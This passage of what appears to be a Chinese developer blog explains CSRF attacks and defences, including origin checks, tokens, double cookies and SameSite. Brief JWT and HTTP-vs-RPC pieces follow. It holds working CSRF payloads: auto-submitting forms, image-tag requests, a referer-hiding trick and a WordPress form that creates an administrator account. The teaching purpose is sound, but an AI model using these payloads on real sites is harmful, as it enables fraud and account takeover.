请求，一般会这样利用： 1&lt;img src=&quot;http://bank.example/withdraw?amount=10000&amp;for=hacker&quot; /&gt; 在受害者访问含有这个 img 的页面后，浏览器会自动向 http://bank.example/withdraw?account=xiaoming&amp;amount=10000&amp;for=hacker 发出一次 HTTP 请求。bank.example 就会收到包含受害者登录信息的一次跨域请求。 POST 类型的 CSRF 这种类型的 CSRF 利用起来通常使用的是一个自动提交的表单，如： 12345678&lt;form action=&quot;http://bank.example/withdraw&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;account&quot; value=&quot;xiaoming&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;amount&quot; value=&quot;10000&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;for&quot; value=&quot;hacker&quot; /&gt;&lt;/form&gt;&lt;script&gt; document.forms[0].submit();&lt;/script&gt; 访问该页面后，表单会自动提交，相当于模拟用户完成了一次 POST 操作。 POST 类型的攻击通常比 GET 要求更加严格一点，但仍并不复杂。任何个人网站、博客，被黑客上传页面的网站都有可能是发起攻击的来源，后端接口不能将安全寄托在仅允许 POST 上面。 链接类型的 CSRF 链接类型的 CSRF 并不常见，比起其他两种用户打开页面就中招的情况，这种需要用户点击链接才会触发。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如： 1234567&lt;a href=&quot;http://test.com/csrf/withdraw.php?amount=1000&amp;for=hacker&quot; taget=&quot;_blank&quot;&gt; 重磅消息！！ &lt;a/&gt;&lt;/a&gt; 由于之前用户登录了信任的网站 A，并且保存登录状态，只要用户主动访问上面的这个 PHP 页面，则表示攻击成功。 CSRF 的特点 攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。 攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据。 整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。 跨站请求可以用各种方式：图片 URL、超链接、CORS、Form 提交等等。部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪。 CSRF 通常是跨域的，因为外域通常更容易被攻击者掌控。但是如果本域下有容易被利用的功能，比如可以发图和链接的论坛和评论区，攻击可以直接在本域下进行，而且这种攻击更加危险。 防护策略CSRF 通常从第三方网站发起，被攻击的网站无法防止攻击发生，只能通过增强自己网站针对 CSRF 的防护能力来提升安全性。 上文中讲了 CSRF 的两个特点： CSRF（通常）发生在第三方域名。 CSRF 攻击者不能获取到 Cookie 等信息，只是使用。 针对这两点，我们可以专门制定防护策略，如下： 阻止不明外域的访问 同源检测 Samesite Cookie 提交时要求附加本域才能获取的信息 CSRF Token 双重 Cookie 验证 以下我们对各种防护方法做详细说明： 同源检测既然 CSRF 大多来自第三方网站，那么我们就直接禁止外域（或者不受信任的域名）对我们发起请求。 那么问题来了，我们如何判断请求是否来自外域呢？ 在 HTTP 协议中，每一个异步请求都会携带两个 Header，用于标记来源域名： Origin Header Referer Header 这两个 Header 在浏览器发起请求时，大多数情况会自动带上，并且不能由前端自定义内容。 服务器可以通过解析这两个 Header 中的域名，确定请求的来源域。 使用 Origin Header 确定来源域名在部分与 CSRF 有关的请求中，请求的 Header 中会携带 Origin 字段。字段内包含请求的域名（不包含 path 及 query）。 如果 Origin 存在，那么直接使用 Origin 中的字段确认来源域名就可以。 但是 Origin 在以下两种情况下并不存在： IE11 同源策略： IE 11 不会在跨站 CORS 请求上添加 Origin 标头，Referer 头将仍然是唯一的标识。最根本原因是因为 IE 11 对同源的定义和其他浏览器有不同，有两个主要的区别，可以参考MDN Same-origin_policy#IE_Exceptions 302 重定向： 在 302 重定向之后 Origin 不包含在重定向的请求中，因为 Origin 可能会被认为是其他来源的敏感信息。对于 302 重定向的情况来说都是定向到新的服务器上的 URL，因此浏览器不想将 Origin 泄漏到新的服务器上。 使用 Referer Header 确定来源域名根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，记录了该 HTTP 请求的来源地址。对于 Ajax 请求，图片和 script 等资源请求，Referer 为发起请求的页面地址。对于页面跳转，Referer 为打开页面历史记录的前一个页面地址。因此我们使用 Referer 中链接的 Origin 部分可以得知请求的来源域名。 这种方法并非万无一失，Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不是很安全。在部分情况下，攻击者可以隐藏，甚至修改自己请求的 Referer。 2014 年，W3C 的 Web 应用安全工作组发布了 Referrer Policy 草案，对浏览器该如何发送 Referer 做了详细的规定。截止现在新版浏览器大部分已经支持了这份草案，我们终于可以灵活地控制自己网站的 Referer 策略了。新版的 Referrer Policy 规定了五种 Referer 策略：No Referrer、No Referrer When Downgrade、Origin Only、Origin When Cross-origin、和 Unsafe URL。之前就存在的三种策略：never、default 和 always，在新标准里换了个名称。他们的对应关系如下： 策略名称 属性值（新） 属性值（旧） No Referrer no-Referrer never No Referrer When Downgrade no-Referrer-when-downgrade default Origin Only (same or strict) origin origin Origin When Cross Origin (strict) origin-when-crossorigin - Unsafe URL unsafe-url always 根据上面的表格因此需要把 Referrer Policy 的策略设置成 same-origin，对于同源的链接和引用，会发送 Referer，referer 值为 Host 不带 Path；跨域访问则不携带 Referer。例如：aaa.com 引用 bbb.com 的资源，不会发送 Referer。 设置 Referrer Policy 的方法有三种： 在 CSP 设置 页面头部增加 meta 标签 a 标签增加 referrerpolicy 属性 上面说的这些比较多，但我们可以知道一个问题：攻击者可以在自己的请求中隐藏 Referer。如果攻击者将自己的请求这样填写： 1234&lt;img src=&quot;http://bank.example/withdraw?amount=10000&amp;for=hacker&quot; referrerpolicy=&quot;no-referrer&quot;/&gt; 那么这个请求发起的攻击将不携带 Referer。 另外在以下情况下 Referer 没有或者不可信： IE6、7 下使用 window.location.href=url 进行界面的跳转，会丢失 Referer。 IE6、7 下使用 window.open，也会缺失 Referer。 HTTPS 页面跳转到 HTTP 页面，所有浏览器 Referer 都丢失。 点击 Flash 上到达另外一个网站的时候，Referer 的情况就比较杂乱，不太可信。 无法确认来源域名情况当 Origin 和 Referer 头文件不存在时该怎么办？如果 Origin 和 Referer 都不存在，建议直接进行阻止，特别是如果您没有使用随机 CSRF Token（参考下方）作为第二次检查。 如何阻止外域请求通过 Header 的验证，我们可以知道发起请求的来源域名，这些来源域名可能是网站本域，或者子域名，或者有授权的第三方域名，又或者来自不可信的未知域名。 我们已经知道了请求域名是否是来自不可信的域名，我们直接阻止掉这些的请求，就能防御 CSRF 攻击了吗？ 且慢！当一个请求是页面请求（比如网站的主页），而来源是搜索引擎的链接（例如百度的搜索结果），也会被当成疑似 CSRF 攻击。所以在判断的时候需要过滤掉页面请求情况，通常 Header 符合以下情况： 12Accept: text/htmlMethod: GET 但相应的，页面请求就暴露在了 CSRF 的攻击范围之中。如果你的网站中，在页面的 GET 请求中对当前用户做了什么操作的话，防范就失效了。 例如，下面的页面请求： 1GET https://example.com/addComment?comment=XXX&amp;dest=orderId 注：这种严格来说并不一定存在 CSRF 攻击的风险，但仍然有很多网站经常把主文档 GET 请求挂上参数来实现产品功能，但是这样做对于自身来说是存在安全风险的。另外，前面说过，CSRF 大多数情况下来自第三方域名，但并不能排除本域发起。如果攻击者有权限在本域发布评论（含链接、图片等，统称 UGC），那么它可以直接在本域发起攻击，这种情况下同源策略无法达到防护的作用。综上所述：同源验证是一个相对简单的防范方法，能够防范绝大多数的 CSRF 攻击。但这并不是万无一失的，对于安全性要求较高，或者有较多用户输入内容的网站，我们就要对关键的接口做额外的防护措施。 CSRF Token前面讲到 CSRF 的另一个特征是，攻击者无法直接窃取到用户的信息（Cookie，Header，网站内容等），仅仅是冒用 Cookie 中的信息。 而 CSRF 攻击之所以能够成功，是因为服务器误把攻击者发送的请求当成了用户自己的请求。那么我们可以要求所有的用户请求都携带一个 CSRF 攻击者无法获取到的 Token。服务器通过校验请求是否携带正确的 Token，来把正常的请求和攻击的请求区分开，也可以防范 CSRF 的攻击。 原理CSRF Token 的防护策略分为三个步骤： 将 CSRF Token 输出到页面中 首先，用户打开页面的时候，服务器需要给这个用户生成一个 Token，该 Token 通过加密算法对数据进行加密，一般 Token 都包括随机字符串和时间戳的组合，显然在提交时 Token 不能再放在 Cookie 中了，否则又会被攻击者冒用。因此，为了安全起见 Token 最好还是存在服务器的 Session 中，之后在每次页面加载时，使用 JS 遍历整个 DOM 树，对于 DOM 中所有的 a 和 form 标签后加入 Token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 HTML 代码，这种方法就没有作用，还需要程序员在编码时手动添加 Token。 页面提交的请求携带这个 Token 对于 GET 请求，Token 将附在请求地址之后，这样 URL 就变成 http://url?csrftoken=tokenvalue。 而对于 POST 请求来说，要在 form 的最后加上： 1&lt;input type=&quot;”hidden”&quot; name=&quot;”csrftoken”&quot; value=&quot;”tokenvalue”&quot; /&gt; 这样，就把 Token 以参数的形式加入请求了。 服务器验证 Token 是否正确 当用户从客户端得到了 Token，再次提交给服务器的时候，服务器需要判断 Token 的有效性，验证过程是先解密 Token，对比加密字符串以及时间戳，如果加密字符串一致且时间未过期，那么这个 Token 就是有效的。这种方法要比之前检查 Referer 或者 Origin 要安全一些，Token 可以在产生并放于 Session 之中，然后在每次请求时把 Token 从 Session 中拿出，与请求中的 Token 进行比对，但这种方法的比较麻烦的在于如何把 Token 以参数的形式加入请求。 下面将以 Java 为例，介绍一些 CSRF Token 的服务端校验逻辑，代码如下： 1234567891011121314151617181920212223HttpServletRequest req = (HttpServletRequest)request;HttpSession s = req.getSession();// 从 session 中得到 csrftoken 属性String sToken = (String)s.getAttribute(&quot;csrftoken&quot;);if(sToken == null){ // 产生新的 token 放入 session 中 sToken = generateToken(); s.setAttribute(&quot;csrftoken&quot;,sToken); chain.doFilter(request, response);} else{ // 从 HTTP 头中取得 csrftoken String xhrToken = req.getHeader(&quot;csrftoken&quot;); // 从请求参数中取得 csrftoken String pToken = req.getParameter(&quot;csrftoken&quot;); if(sToken != null &amp;&amp; xhrToken != null &amp;&amp; sToken.equals(xhrToken)){ chain.doFilter(request, response); }else if(sToken != null &amp;&amp; pToken != null &amp;&amp; sToken.equals(pToken)){ chain.doFilter(request, response); }else{ request.getRequestDispatcher(&quot;error.jsp&quot;).forward(request,response); }} 代码源自IBM developerworks CSRF 这个 Token 的值必须是随机生成的，这样它就不会被攻击者猜到，考虑利用 Java 应用程序的 java.security.SecureRandom 类来生成足够长的随机标记，替代生成算法包括使用 256 位 BASE64 编码哈希，选择这种生成算法的开发人员必须确保在散列数据中使用随机性和唯一性来生成随机标识。通常，开发人员只需为当前会话生成一次 Token。在初始生成此 Token 之后，该值将存储在会话中，并用于每个后续请求，直到会话过期。当最终用户发出请求时，服务器端必须验证请求中 Token 的存在性和有效性，与会话中找到的 Token 相比较。如果在请求中找不到 Token，或者提供的值与会话中的值不匹配，则应中止请求，应重置 Token 并将事件记录为正在进行的潜在 CSRF 攻击。 分布式校验在大型网站中，使用 Session 存储 CSRF Token 会带来很大的压力。访问单台服务器 session 是同一个。但是现在的大型网站中，我们的服务器通常不止一台，可能是几十台甚至几百台之多，甚至多个机房都可能在不同的省份，用户发起的 HTTP 请求通常要经过像 Ngnix 之类的负载均衡器之后，再路由到具体的服务器上，由于 Session 默认存储在单机服务器内存中，因此在分布式环境下同一个用户发送的多次 HTTP 请求可能会先后落到不同的服务器上，导致后面发起的 HTTP 请求无法拿到之前的 HTTP 请求存储在服务器中的 Session 数据，从而使得 Session 机制在分布式环境下失效，因此在分布式集群中 CSRF Token 需要存储在 Redis 之类的公共存储空间。 由于使用 Session 存储，读取和验证 CSRF Token 会引起比较大的复杂度和性能问题，目前很多网站采用 Encrypted Token Pattern 方式。这种方法的 Token 是一个计算出来的结果，而非随机生成的字符串。这样在校验时无需再去读取存储的 Token，只用再次计算一次即可。 这种 Token 的值通常是使用 UserID、时间戳和随机数，通过加密的方法生成。这样既可以保证分布式服务的 Token 一致，又能保证 Token 不容易被破解。 在 token 解密成功之后，服务器可以访问解析值，Token 中包含的 UserID 和时间戳将会被拿来被验证有效性，将 UserID 与当前登录的 UserID 进行比较，并将时间戳与当前时间进行比较。 总结Token 是一个比较有效的 CSRF 防护方法，只要页面没有 XSS 漏洞泄露 Token，那么接口的 CSRF 攻击就无法成功。但是此方法的实现比较复杂，需要给每一个页面都写入 Token（前端无法使用纯静态页面），每一个 Form 及 Ajax 请求都携带这个 Token，后端对每一个接口都进行校验，并保证页面 Token 及请求 Token 一致。这就使得这个防护策略不能在通用的拦截上统一拦截处理，而需要每一个页面和接口都添加对应的输出和校验。这种方法工作量巨大，且有可能遗漏。 验证码和密码其实也可以起到 CSRF Token 的作用哦，而且更安全。 为什么很多银行等网站会要求已经登录的用户在转账时再次输入密码，现在是不是有一定道理了？ 双重 Cookie 验证在会话中存储 CSRF Token 比较繁琐，而且不能在通用的拦截上统一处理所有的接口。 那么另一种防御措施是使用双重提交 Cookie。利用 CSRF 攻击不能获取到用户 Cookie 的特点，我们可以要求 Ajax 和表单请求携带一个 Cookie 中的值。 双重 Cookie 采用以下流程： 在用户访问网站页面时，向请求域名注入一个 Cookie，内容为随机字符串（例如 csrfcookie=v8g9e4ksfhw）。 在前端向后端发起请求时，取出 Cookie，并添加到 URL 的参数中（接上例 POST https://www.a.com/comment?csrfcookie=v8g9e4ksfhw）。 后端接口验证 Cookie 中的字段与 URL 参数中的字段是否一致，不一致则拒绝。 此方法相对于 CSRF Token 就简单了许多。可以直接通过前后端拦截的的方法自动化实现。后端校验也更加方便，只需进行请求中字段的对比，而不需要再进行查询和存储 Token。当然，此方法并没有大规模应用，其在大型网站上的安全性还是没有 CSRF Token 高，原因我们举例进行说明。由于任何跨域都会导致前端无法获取 Cookie 中的字段（包括子域名之间），于是发生了如下情况： 如果用户访问的网站为www.a.com，而后端的api域名为api.a.com。那么在www.a.com下，前端拿不到api.a.com的Cookie，也就无法完成双重Cookie认证。 于是这个认证 Cookie 必须被种在 a.com 下，这样每个子域都可以访问。 任何一个子域都可以修改 a.com 下的 Cookie。 某个子域名存在漏洞被 XSS 攻击（例如 upload.a.com）。虽然这个子域下并没有什么值得窃取的信息。但攻击者修改了 a.com 下的 Cookie。 攻击者可以直接使用自己配置的 Cookie，对 XSS 中招的用户再向www.a.com下，发起CSRF攻击。 总结用双重 Cookie 防御 CSRF 的优点： 无需使用 Session，适用面更广，易于实施。 Token 储存于客户端中，不会给服务器带来压力。 相对于 Token，实施成本更低，可以在前后端统一拦截校验，而不需要一个个接口和页面添加。 缺点： Cookie 中增加了额外的字段。 如果有其他漏洞（例如 XSS），攻击者可以注入 Cookie，那么该防御方式失效。 难以做到子域名的隔离。 为了确保 Cookie 传输安全，采用这种防御方式的最好确保用整站 HTTPS 的方式，如果还没切 HTTPS 的使用这种方式也会有风险。 Samesite Cookie 属性防止 CSRF 攻击的办法已经有上面的预防措施。为了从源头上解决这个问题，Google 起草了一份草案来改进 HTTP 协议，那就是为 Set-Cookie 响应头新增 Samesite 属性，它用来标明这个 Cookie 是个“同站 Cookie”，同站 Cookie 只能作为第一方 Cookie，不能作为第三方 Cookie，Samesite 有两个属性值，分别是 Strict 和 Lax，下面分别讲解： Samesite=Strict这种称为严格模式，表明这个 Cookie 在任何情况下都不可能作为第三方 Cookie，绝无例外。比如说 b.com 设置了如下 Cookie： 123Set-Cookie: foo=1; Samesite=StrictSet-Cookie: bar=2; Samesite=LaxSet-Cookie: baz=3 我们在 a.com 下发起对 b.com 的任意请求，foo 这个 Cookie 都不会被包含在 Cookie 请求头中，但 bar 会。举个实际的例子就是，假如淘宝网站用来识别用户登录与否的 Cookie 被设置成了 Samesite=Strict，那么用户从百度搜索页面甚至天猫页面的链接点击进入淘宝后，淘宝都不会是登录状态，因为淘宝的服务器不会接受到那个 Cookie，其它网站发起的对淘宝的任意请求都不会带上那个 Cookie。 Samesite=Lax这种称为宽松模式，比 Strict 放宽了点限制：假如这个请求是这种请求（改变了当前页面或者打开了新页面）且同时是个 GET 请求，则这个 Cookie 可以作为第三方 Cookie。比如说 b.com 设置了如下 Cookie： 123Set-Cookie: foo=1; Samesite=StrictSet-Cookie: bar=2; Samesite=LaxSet-Cookie: baz=3 当用户从 a.com 点击链接进入 b.com 时，foo 这个 Cookie 不会被包含在 Cookie 请求头中，但 bar 和 baz 会，也就是说用户在不同网站之间通过链接跳转是不受影响了。但假如这个请求是从 a.com 发起的对 b.com 的异步请求，或者页面跳转是通过表单的 post 提交触发的，则 bar 也不会发送。 生成 Token 放到 Cookie 中并且设置 Cookie 的 Samesite，Java 代码如下： 123456789private void addTokenCookieAndHeader(HttpServletRequest httpRequest, HttpServletResponse httpResponse) { //生成token String sToken = this.generateToken(); //手动添加Cookie实现支持“Samesite=strict” //Cookie添加双重验证 String CookieSpec = String.format(&quot;%s=%s; Path=%s; HttpOnly; Samesite=Strict&quot;, this.determineCookieName(httpRequest), sToken, httpRequest.getRequestURI()); httpResponse.addHeader(&quot;Set-Cookie&quot;, CookieSpec); httpResponse.setHeader(CSRF_TOKEN_NAME, token);} 代码源自OWASP Cross-Site_Request_Forgery #Implementation example 我们应该如何使用 SamesiteCookie如果 SamesiteCookie 被设置为 Strict，浏览器在任何跨域请求中都不会携带 Cookie，新标签重新打开也不携带，所以说 CSRF 攻击基本没有机会。 但是跳转子域名或者是新标签重新打开刚登陆的网站，之前的 Cookie 都不会存在。尤其是有登录的网站，那么我们新打开一个标签进入，或者跳转到子域名的网站，都需要重新登录。对于用户来讲，可能体验不会很好。 如果 SamesiteCookie 被设置为 Lax，那么其他网站通过页面跳转过来的时候可以使用 Cookie，可以保障外域连接打开页面时用户的登录状态。但相应的，其安全性也比较低。 另外一个问题是 Samesite 的兼容性不是很好，现阶段除了从新版 Chrome 和 Firefox 支持以外，Safari 以及 iOS Safari 都还不支持，现阶段看来暂时还不能普及。 而且，SamesiteCookie 目前有一个致命的缺陷：不支持子域。例如，种在 topic.a.com 下的 Cookie，并不能使用 a.com 下种植的 SamesiteCookie。这就导致了当我们网站有多个子域名时，不能使用 SamesiteCookie 在主域名存储用户登录信息。每个子域名都需要用户重新登录一次。 总之，SamesiteCookie 是一个可能替代同源验证的方案，但目前还并不成熟，其应用场景有待观望。 防止网站被利用前面所说的，都是被攻击的网站如何做好防护。而非防止攻击的发生，CSRF 的攻击可以来自： 攻击者自己的网站。 有文件上传漏洞的网站。 第三方论坛等用户内容。 被攻击网站自己的评论功能等。 对于来自黑客自己的网站，我们无法防护。但对其他情况，那么如何防止自己的网站被利用成为攻击的源头呢？ 严格管理所有的上传接口，防止任何预期之外的上传内容（例如 HTML）。 添加 Header X-Content-Type-Options: nosniff 防止黑客上传 HTML 内容的资源（例如图片）被解析为网页。 对于用户上传的图片，进行转存或者校验。不要直接使用用户填写的图片链接。 当前用户打开其他用户填写的链接时，需告知风险（这也是很多论坛不允许直接在内容中发布外域链接的原因之一，不仅仅是为了用户留存，也有安全考虑） CSRF 其他防范措施对于一线的程序员同学，我们可以通过各种防护策略来防御 CSRF，对于 QA、SRE、安全负责人等同学，我们可以做哪些事情来提升安全性呢？ CSRF 测试CSRFTester 是一款 CSRF 漏洞的测试工具，CSRFTester 工具的测试原理大概是这样的，使用代理抓取我们在浏览器中访问过的所有的连接以及所有的表单等信息，通过在 CSRFTester 中修改相应的表单等信息，重新提交，相当于一次伪造客户端请求，如果修改后的测试请求成功被网站服务器接受，则说明存在 CSRF 漏洞，当然此款工具也可以被用来进行 CSRF 攻击。CSRFTester 使用方法大致分下面几个步骤： 步骤 1：设置浏览器代理 CSRFTester 默认使用 Localhost 上的端口 8008 作为其代理，如果代理配置成功，CSRFTester 将为您的浏览器生成的所有后续 HTTP 请求生成调试消息。 步骤 2：使用合法账户访问网站开始测试 我们需要找到一个我们想要为 CSRF 测试的特定业务 Web 页面。找到此页面后，选择 CSRFTester 中的“开始录制”按钮并执行业务功能；完成后，点击 CSRFTester 中的“停止录制”按钮；正常情况下，该软件会全部遍历一遍当前页面的所有请求。 步骤 3：通过 CSRF 修改并伪造请求 之后，我们会发现软件上有一系列跑出来的记录请求，这些都是我们的浏览器在执行业务功能时生成的所有 GET 或者 POST 请求。通过选择列表中的某一行，我们现在可以修改用于执行业务功能的参数，可以通过点击对应的请求修改 query 和 form 的参数。当修改完所有我们希望诱导用户 form 最终的提交值，可以选择开始生成 HTML 报告。 步骤 4：拿到结果如有漏洞进行修复 首先必须选择“报告类型”。报告类型决定了我们希望受害者浏览器如何提交先前记录的请求。目前有 5 种可能的报告：表单、iFrame、IMG、XHR 和链接。一旦选择了报告类型，我们可以选择在浏览器中启动新生成的报告，最后根据报告的情况进行对应的排查和修复。 CSRF 监控对于一个比较复杂的网站系统，某些项目、页面、接口漏掉了 CSRF 防护措施是很可能的。 一旦发生了 CSRF 攻击，我们如何及时的发现这些攻击呢？ CSRF 攻击有着比较明显的特征： 跨域请求。 GET 类型请求 Header 的 MIME 类型大概率为图片，而实际返回 Header 的 MIME 类型为 Text、JSON、HTML。 我们可以在网站的代理层监控所有的接口请求，如果请求符合上面的特征，就可以认为请求有 CSRF 攻击嫌疑。我们可以提醒对应的页面和项目负责人，检查或者 Review 其 CSRF 防护策略。 个人用户 CSRF 安全的建议经常上网的个人用户，可以采用以下方法来保护自己： 使用网页版邮件的浏览邮件或者新闻也会带来额外的风险，因为查看邮件或者新闻消息有可能导致恶意代码的攻击。 尽量不要打开可疑的链接，一定要打开时，使用不常用的浏览器。 总结简单总结一下上文的防护策略： CSRF 自动防御策略：同源检测（Origin 和 Referer 验证）。 CSRF 主动防御措施：Token 验证 或者 双重 Cookie 验证 以及配合 Samesite Cookie。 保证页面的幂等性，后端接口不要在 GET 页面中做用户操作。 为了更好的防御 CSRF，最佳实践应该是结合上面总结的防御措施方式中的优缺点来综合考虑，结合当前 Web 应用程序自身的情况做合适的选择，才能更好的预防 CSRF 的发生。 历史案例WordPress 的 CSRF 漏洞2012 年 3 月份，WordPress 发现了一个 CSRF 漏洞，影响了 WordPress 3.3.1 版本，WordPress 是众所周知的博客平台，该漏洞可以允许攻击者修改某个 Post 的标题，添加管理权限用户以及操作用户账户，包括但不限于删除评论、修改头像等等。具体的列表如下: Add Admin/User Delete Admin/User Approve comment Unapprove comment Delete comment Change background image Insert custom header image Change site title Change administrator’s email Change Wordpress Address Change Site Address 那么这个漏洞实际上就是攻击者引导用户先进入目标的 WordPress，然后点击其钓鱼站点上的某个按钮，该按钮实际上是表单提交按钮，其会触发表单的提交工作，添加某个具有管理员权限的用户，实现的码如下： 12345678910111213141516171819202122232425262728293031&lt;html&gt; &lt;body onload=&quot;javascript:document.forms[0].submit()&quot;&gt; &lt;h2&gt;CSRF Exploit to add Administrator&lt;/h2&gt; &lt;form method=&quot;POST&quot; name=&quot;form0&quot; action=&quot;http://&lt;wordpress_ip&gt;:80/wp-admin/user-new.php&quot; &gt; &lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;createuser&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;_wpnonce_create-user&quot; value=&quot;&lt;sniffed_value&gt;&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;_wp_http_referer&quot; value=&quot;%2Fwordpress%2Fwp-admin%2Fuser-new.php&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;user_login&quot; value=&quot;admin2&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;admin2@admin.com&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;first_name&quot; value=&quot;admin2@admin.com&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;last_name&quot; value=&quot;&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;url&quot; value=&quot;&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;pass1&quot; value=&quot;password&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;pass2&quot; value=&quot;password&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;role&quot; value=&quot;administrator&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;createuser&quot; value=&quot;Add+New+User+&quot; /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; YouTube 的 CSRF 漏洞008 年，有安全研究人员发现，YouTube 上几乎所有用户可以操作的动作都存在 CSRF 漏洞。如果攻击者已经将视频添加到用户的“Favorites”，那么他就能将他自己添加到用户的“Friend”或者“Family”列表，以用户的身份发送任意的消息，将视频标记为不宜的，自动通过用户的联系人来共享一个视频。例如，要把视频添加到用户的“Favorites”，攻击者只需在任何站点上嵌入如下所示的 IMG 标签： 1234&lt;img src=&quot;http://youtube.com/watch_ajax?action_add_favorite_playlist=1&amp;video_id=[VIDEO ID]&amp;playlist_id=&amp;add_to_favorite=1&amp;show=1&amp;button=AddvideoasFavorite&quot;/&gt; 攻击者也许已经利用了该漏洞来提高视频的流行度。例如，将一个视频添加到足够多用户的“Favorites”，YouTube 就会把该视频作为“Top Favorites”来显示。除提高一个视频的流行度之外，攻击者还可以导致用户在毫不知情的情况下将一个视频标记为“不宜的”，从而导致 YouTube 删除该视频。 这些攻击还可能已被用于侵犯用户隐私。YouTube 允许用户只让朋友或亲属观看某些视频。这些攻击会导致攻击者将其添加为一个用户的“Friend”或“Family”列表，这样他们就能够访问所有原本只限于好友和亲属表中的用户观看的私人的视频。 攻击者还可以通过用户的所有联系人名单（“Friends”、“Family”等等）来共享一个视频，“共享”就意味着发送一个视频的链接给他们，当然还可以选择附加消息。这条消息中的链接已经并不是真正意义上的视频链接，而是一个具有攻击性的网站链接，用户很有可能会点击这个链接，这便使得该种攻击能够进行病毒式的传播。","link":"/backend/how_csrf/"},{"title":"什么是 JWT,JWS与JWE","text":"随着移动互联网的兴起，传统基于 session/cookie 的 web 网站认证方式转变为了基于 OAuth2 等开放授权协议的单点登录模式（SSO），相应的基于服务器 session+ 浏览器 cookie 的 Auth 手段也发生了转变，Json Web Token 出现成为了当前的热门的 Token Auth 机制。 作者：0xCoffee链接：https://www.jianshu.com/p/50ade6f2e4fd Json Web Token(JWT)JSON Web Token（JWT）是一个非常轻巧的规范。这个规范允许我们使用JWT在两个组织之间传递安全可靠的信息。 官方定义: JSON Web Token (JWT) is a compact URL-safe means of representing claims to be transferred between two parties 现在网上大多数介绍JWT的文章实际介绍的都是JWS(JSON Web Signature)，也往往导致了人们对于JWT的误解，但是JWT并不等于JWS，JWS只是JWT的一种实现，除了JWS外，JWE(JSON Web Encryption)也是JWT的一种实现。 下面就来详细介绍一下JWT与JWE的两种实现方式： JSON Web Signature(JWS)JSON Web Signature是一个有着简单的统一表达形式的字符串： 头部 (Header)头部用于描述关于该JWT的最基本的信息，例如其类型以及签名所用的算法等。 JSON内容要经Base64 编码生成字符串成为Header。 载荷（PayLoad）payload的五个字段都是由JWT的标准所定义的。 iss(issuer): 签发人 exp (expiration time)：过期时间 sub (subject)：主题 aud (audience)：受众 nbf (Not Before)：生效时间 iat (Issued At)：签发时间 jti (JWT ID)：编号 JSON内容要经Base64 编码生成字符串成为PayLoad。 签名（signature）这个部分header与payload通过header中声明的加密方式，使用密钥secret进行加密，生成签名。 JWS的主要目的是保证了数据在传输过程中不被修改，验证数据的完整性。 但由于仅采用Base64对消息内容编码，因此不保证数据的不可泄露性，所以不适合用于传输敏感数据。 JSON Web Encryption(JWE)相对于JWS，JWE则同时保证了安全性与数据完整性。JWE由五部分组成： 具体生成步骤为： JOSE 含义与 JWS 头部相同。 生成一个随机的 Content Encryption Key （CEK）。 使用 RSAES-OAEP 加密算法，用公钥加密CEK，生成 JWE Encrypted Key。 生成JWE初始化向量。 使用 AES GCM 加密算法对明文部分进行加密生成密文 Ciphertext，算法会随之生成一个128位的认证标记 Authentication Tag。 对五个部分分别进行 base64 编码。 可见，JWE的计算过程相对繁琐，不够轻量级，因此适合与数据传输而非token认证，但该协议也足够安全可靠，用简短字符串描述了传输内容，兼顾数据的安全性与完整性。","link":"/backend/what_jwt/"},{"title":"既然有 HTTP 请求，为什么还要用 RPC 调用 ?","text":"首先，HTTP 和 RPC 不是对等的概念 RPC 是一个完整的远程调用方案，它包括了：接口规范+序列化反序列化规范+通信协议等，而 HTTP 只是一个通信协议，工作在 OSI 的第七层，不是一个完整的远程调用方案 基于 HTTP 的远程调用方案（包含了接口规范、序列化反序列化等） 和 使用 RPC 的远程调用方案 有什么不同 ？ 作者：易哥链接：https://www.zhihu.com/question/41609070/answer/1030913797 我们先介绍基于 HTTP 的远程调用方案。 HTTP+Restful，其优势很大。它可读性好，且可以得到防火墙的支持、跨语言的支持。而且，在近几年的报告中，Restful 大有超过 RPC 的趋势。 但是使用该方案也有其缺点，这是与其优点相对应的： 首先是有用信息占比少，毕竟 HTTP 工作在第七层，包含了大量的 HTTP 头等信息。 其次是效率低，还是因为第七层的缘故，必须按照 HTTP 协议进行层层封装。 还有，其可读性似乎没有必要，因为我们可以引入网关增加可读性。 此外，使用 HTTP 协议调用远程方法比较复杂，要封装各种参数名和参数值。 而 RPC 则与 HTTP 互补，我们详细介绍下。看完这篇回答，能让你对 RPC 的产生、原理、实现代码都有着清晰的了解。 这样，也能在业务系统中，在 RPC 和 HTTP 之间做好抉择。 但需要再说一句，不是说 RPC 好，也不是说 HTTP 好，两者各有千秋，还在比拼中。 要问我站谁？我根据业务场景，灵活站位…… 评论区产生了一些争论，我在这里统一进行说明。争论主要发生在两点： HTTP 和 RPC 同一级别，还是被 RPC 包含？ Restful 也属于 RPC 么？ 对于以上两点，我画图来一一说明。 上图是一个比较完整的关系图，这时我们发现 HTTP（图中蓝色框）出现了两次。其中一个是和 